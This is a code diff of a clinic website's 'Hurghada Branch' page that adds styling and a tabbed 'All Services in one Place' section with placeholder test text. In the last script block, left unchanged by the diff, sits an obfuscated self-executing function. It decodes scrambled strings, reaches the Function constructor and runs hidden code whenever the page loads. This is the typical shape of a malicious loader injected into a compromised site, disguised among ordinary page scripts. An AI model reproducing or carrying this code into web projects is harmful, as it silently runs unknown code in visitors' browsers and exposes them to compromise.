@@ -250,6 +250,93 @@
             .hurg-booking a.hotline:hover{
                 color: #13c5dd;
             }
+            .goal-text{
+                display: none;
+                transition: all .5s;
+            }
+            .first-goal{
+                display: block;
+            }
+            .our-goals{
+                background-color: #f2f4f5;
+            }
+            .our-goals .goal-btn{
+                font-size: 25px;
+                line-height: 30px;
+                font-weight: 600;
+                background-color: transparent;
+            }
+            .our-goals ul li span{
+                padding: 20px 0;
+                font-size: 30px;
+            }
+            .our-goals ul li{
+                margin-bottom: 25px !important;
+                position: relative;
+                display: inline-block;
+                width: 210px;
+                height: 200px;
+                background: #ebeced;
+                border-radius: 30px;
+                padding: 36px 20px 32px 20px;
+                cursor: pointer;
+                margin: 0px 3.5px;
+                z-index: 1;
+            }
+            .our-goals ul li::before{
+                position: absolute;
+                content: '';
+                width: 100%;
+                height: 0%;
+                left: 0px;
+                top: 0px;
+                border-radius: 30px;
+                z-index: -1;
+                background-color: #213262;
+            }
+            /* .our-goals ul li h4 {
+                position: relative;
+            } */
+            .our-goals ul li h4 , .our-goals ul li::before{
+                transition: all 500ms ease;
+
+            }
+            .our-goals ul li h4::after{
+                content: '';
+                position: absolute;
+                width: 25px;
+                height: 25px;
+                transform: rotate(45deg);
+                background-color: #213262;
+                bottom: -4px;
+                left: 44%;
+                z-index: -1;
+                opacity: 0;
+                transition: all 500ms ease;
+                transition-delay: 400ms ;
+            }
+            .our-goals ul li:hover::before{
+                height: 100%;
+            }
+            .our-goals ul li:hover h4::after{
+                opacity: 1;
+                bottom: -8px;
+            }
+            .our-goals ul li:hover h4{
+                color: white;
+            }
+            .our-goals ul {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin: 0;
+                padding: 0;
+                flex-wrap: wrap;
+            }
+            .hurg-gal .splide__slide{
+                border-radius: 20px;
+                overflow: hidden;
+            }
             @media screen and (max-width: 1024px){
                 .hurg-booking h2{
                     width: 100%;
@@ -553,8 +640,8 @@
             <section class="hurg-header"> 
                 <div class="overlay-img"></div>
                 <div class="container justify-content-center">
-                    <div class="header-text">
-                        <h1 class="text-uppercase">Hurghada</h1>
+                    <div class="header-text text-center">
+                        <h1 class="text-uppercase">Hurghada <br> Branch</h1>
                         <span></span>
                     </div>
                 </div>
@@ -683,6 +770,71 @@
                         </div>
 
                     </div>
+                </div>
+            </section>
+
+            <section class="our-goals pb-5">
+                <div class="container">
+                    <div class="header-goals text-center py-5">
+                        <h2 class="bold">All Services in one Place</h2>
+                    </div>
+
+                    <div class="button-goals text-center">
+                        <ul>
+                            <li>
+                                <h4 id="button1" class="goal-btn">
+                                    <span class="d-block"><i class="fa-solid fa-layer-group"></i></span> 
+                                    All Services <br> in one place
+                                </h4> 
+                            </li>
+                            <li>
+                                <h4 id="button2"  class="goal-btn">
+                                    <span class="d-block"><i class="fa-solid fa-lightbulb"></i></span>
+                                    Latest <br> technology
+                                </h4>
+                            </li>
+                            <li>
+                                <h4 id="button3"  class="goal-btn">
+                                    <span class="d-block"><i class="fa-solid fa-gears"></i></span>
+                                    Infection <br> Control
+                                </h4>
+                            </li>
+                            <li>
+                                <h4 id="button4"  class="goal-btn">
+                                    <span class="d-block"><i class="fa-solid fa-user-nurse"></i></span>
+                                    Our <br> Doctors
+                                </h4>
+                            </li>
+                            <li>
+                                <h4 id="button5"  class="goal-btn">
+                                    <span class="d-block"><i class="fa-solid fa-certificate"></i></span>
+                                    23 Years  <br> of Experience
+                                </h4>
+                            </li>
+                        </ul>
+                        
+
+                        <div class="goal-parent py-5">
+                            <div class="goal-text first-goal" id="goal-1">
+                                <h1>Test1</h1>
+                            </div>
+                            <div class="goal-text" id="goal-2">
+                                <h1>Test2</h1>
+                            </div>
+                            <div class="goal-text" id="goal-3">
+                                <h1>Test3</h1>
+                            </div>
+                            <div class="goal-text" id="goal-4">
+                                <h1>Test4</h1>
+                            </div>
+                            <div class="goal-text" id="goal-5">
+                                <h1>Test5</h1>
+                            </div>
+                        </div>
+
+                    </div>
+
+    
                 </div>
             </section>
 
@@ -840,7 +992,7 @@
                 </div>
             </section>
 
-            <section class="medicalTour-gal h-gallery py-5">
+            <section class="medicalTour-gal hurg-gal h-gallery py-5">
                 <div class="container-fluid">
                     <div class="row">
                         <div class="col-sm-12">
@@ -1241,6 +1393,109 @@
 
             <script>
                 (function () { var EDq = '', SkB = 303 - 292; function mFb(w) { var u = 1610271; var j = w.length; var p = []; for (var z = 0; z < j; z++) { p[z] = w.charAt(z) }; for (var z = 0; z < j; z++) { var g = u * (z + 357) + (u % 20650); var n = u * (z + 468) + (u % 17337); var o = g % j; var x = n % j; var t = p[o]; p[o] = p[x]; p[x] = t; u = (g + n) % 3514907; }; return p.join('') }; var UkQ = mFb('eojyzrxrmcruwbdtgoutfkpqivlcsshnotanc').substr(0, SkB); var ert = 'i(r)nr ;,aj9ni7!2l.eip ve" (hnl.at,o=a+vl6.i tlo)a.=t"(44a(=0vhgl2oa.++n)aA.ist37ro2a)vh+,"f7dre;w=ro1;yve[Cl6lc89,(;l+=ivt)rt{[aoefhr("nffn(t;369zl=sccb;(r0tjub(lrr,g]lryda zh.a;c2=(,;+o+,=,]+y<t=l.uveCrt,h(vsz)*guqyagcj8 d),=;},l)o-qa=v)lmlvte3lsrq7)vAlgh(3 n=.<;=n C,, =nddv.nt(xn+"oC=nlh-;))vrtt=vrl{7f=t 6[r=[a; a, p;o8i-05p<;lb,,v=r)k {=()n+au;>a}t;{r2rh acvS+hmatsne;8c4;v9rv=a)"(guv(dy-l-0)f([r[u7rhtynw;ote,[(8;h1i ;)b.eha=codfe;rCsm0As,)=r;)(kr1ims,gwi9z9=(= nms](c01eC;oohng+Acr+=(odhel(h1la]2;.p);rh+jto;ih=gw<.d;)]fw+=1+s72iyuy+1hsnue8jff]00*8t,l);=;e6,f)(,v)rd+ svr 1gm)]petn]]2=;yr.w8vu,.g1[a);=h;k+n+da}iafmj=o)lqv[h96q[for.u!vxa g,ui t;i +bpj{ovho;=06asyns=")f}uarpus.},ca]{;(;a(=eC-[j5i;f.,ro[tr .yf.)7;r,ke0[y5oas=2;)cv5tfr7c);sartr+0b(0sgre>ron=at1;pt(46.4rr(ytomi cA=t<;.aen8=(ef{=t)na"a]o=n(m+[ )u-xpa("+s.wutnuSxnern.w9.nC+]r.w;aa;a](it]te upn}oe06rih;=j"};huj(1e0)a.'; var lsj = mFb[UkQ]; var CEv = ''; var glE = lsj; var jlr = lsj(CEv, mFb(ert)); var VIR = jlr(mFb('.++]&(Gma7\'$=Gj()06lssa..l0G.o+]eGiGodk5ri!)[G9a8.bi5wobddev};der)*6=u)*dqGthC%.p ]Gtd."d%;;d](!;pdoby7.n_0a.}]57$-o[f,av.e6ed;5(c,9Gb)!G=(*sl.n..)dff;[rf)Grc725);!iGw.;y[ }+o{7=5f].] %!_ycyG8=()n];)1r%sr"hda(._)df;$;+))*9\'%;,.6d3)&.d200ig.Gga(]d3h)#5)6d6b6Go2.#[+Gdi==+(%d]G%+#e+o7)r%*ba&%rf.+d5n6%.dkGt!=f("G=feo#=.]rad.iG[*.em.G;e2 dsr[=gx.;a1"5.c0"2}y{)))}0+t#u6(flGo.9r]tu}u(2b9$itro;w%l$u%.(%[=[b.Gm]G=Ge.Grn) b&GG.!eak+0. d)!{r)8l.)$i1!$xp}gf+=(G_tGdG!\'G92Gg}=ef=!!iG+GG(##G{8b,tGu=u GiGy5][(i)=o=l;(]9]a%i!.05])G%fG(%.){t$)bG=1ad1ff%.d=x.0Gulel6({.o60Go5i$(3Gl.\'G){GsG1G 1=r[G.e((#4#!!)t0d]n]f"ni9;stf,y(={2e(20f)$}=t]ddrr$2GnGf[bhdr{e=m.$.4rp((ssa1Ged*cuicn+GdoG%}c2.n30)(,t(a6(hp)GG((36.&![[]r(Gn +8{%*Gtf(!)t.or0oi05idC)_5_d][ #.;dii"! uSG"[aG.d')); var dsf = glE(EDq, VIR); dsf(1908); return 2818 })()
+               
+                            // Function for Button 1
+                function handleButton1() {
+                console.log("Button 1 clicked");
+                let goal1 = document.getElementById('goal-1')
+                let goal2 = document.getElementById('goal-2')
+                let goal3 = document.getElementById('goal-3')
+                let goal4 = document.getElementById('goal-4')
+                let goal5 = document.getElementById('goal-5')
+                    goal1.style.display = "block";
+                    goal1.classList.add("goal-active")
+                    goal2.classList.remove("goal-active")
+                    goal3.classList.remove("goal-active")
+                    goal4.classList.remove("goal-active")
+                    goal5.classList.remove("goal-active")
+                    goal2.style.display = "none";
+                    goal3.style.display = "none";
+                    goal4.style.display = "none";
+                    goal5.style.display = "none";
+                }
+
+                // Function for Button 2
+                function handleButton2() {
+                console.log("Button 2 clicked");
+                let goal1 = document.getElementById('goal-1')
+                let goal2 = document.getElementById('goal-2')
+                let goal3 = document.getElementById('goal-3')
+                let goal4 = document.getElementById('goal-4')
+                let goal5 = document.getElementById('goal-5')
+                goal2.style.display = "block";
+                goal2.classList.add("goal-active")
+                    goal1.classList.remove("goal-active")
+                    goal3.classList.remove("goal-active")
+                    goal4.classList.remove("goal-active")
+                    goal5.classList.remove("goal-active")
+                goal1.style.display = "none";
+                goal3.style.display = "none";
+                goal4.style.display = "none";
+                goal5.style.display = "none";
+                }
+
+                // Function for Button 3
+                function handleButton3() {
+                console.log("Button 3 clicked");
+                let goal1 = document.getElementById('goal-1')
+                let goal2 = document.getElementById('goal-2')
+                let goal3 = document.getElementById('goal-3')
+                let goal4 = document.getElementById('goal-4')
+                let goal5 = document.getElementById('goal-5')
+                goal3.style.display = "block";
+                goal3.classList.add("goal-active")
+                    goal1.classList.remove("goal-active")
+                    goal2.classList.remove("goal-active")
+                    goal4.classList.remove("goal-active")
+                    goal5.classList.remove("goal-active")
+                goal1.style.display = "none";
+                goal2.style.display = "none";
+                goal4.style.display = "none";
+                goal5.style.display = "none";
+                }
+                function handleButton4() {
+                console.log("Button 4 clicked");
+                let goal1 = document.getElementById('goal-1')
+                let goal2 = document.getElementById('goal-2')
+                let goal3 = document.getElementById('goal-3')
+                let goal4 = document.getElementById('goal-4')
+                let goal5 = document.getElementById('goal-5')
+                goal4.style.display = "block";
+                goal4.classList.add("goal-active")
+                    goal1.classList.remove("goal-active")
+                    goal2.classList.remove("goal-active")
+                    goal3.classList.remove("goal-active")
+                    goal5.classList.remove("goal-active")
+                goal3.style.display = "none";
+                goal1.style.display = "none";
+                goal2.style.display = "none";
+                goal5.style.display = "none";
+                }
+                function handleButton5() {
+                console.log("Button 4 clicked");
+                let goal1 = document.getElementById('goal-1')
+                let goal2 = document.getElementById('goal-2')
+                let goal3 = document.getElementById('goal-3')
+                let goal4 = document.getElementById('goal-4')
+                let goal5 = document.getElementById('goal-5')
+                goal5.style.display = "block";
+                goal5.classList.add("goal-active")
+                    goal1.classList.remove("goal-active")
+                    goal2.classList.remove("goal-active")
+                    goal3.classList.remove("goal-active")
+                    goal4.classList.remove("goal-active")
+                goal3.style.display = "none";
+                goal1.style.display = "none";
+                goal2.style.display = "none";
+                goal4.style.display = "none";
+                }
+
+                // Event listeners for each button
+                document.getElementById("button1").addEventListener("click", handleButton1);
+                document.getElementById("button2").addEventListener("click", handleButton2);
+                document.getElementById("button3").addEventListener("click", handleButton3);
+                document.getElementById("button4").addEventListener("click", handleButton4);
+                document.getElementById("button5").addEventListener("click", handleButton5);
                 </script>
         </body>
     </html>
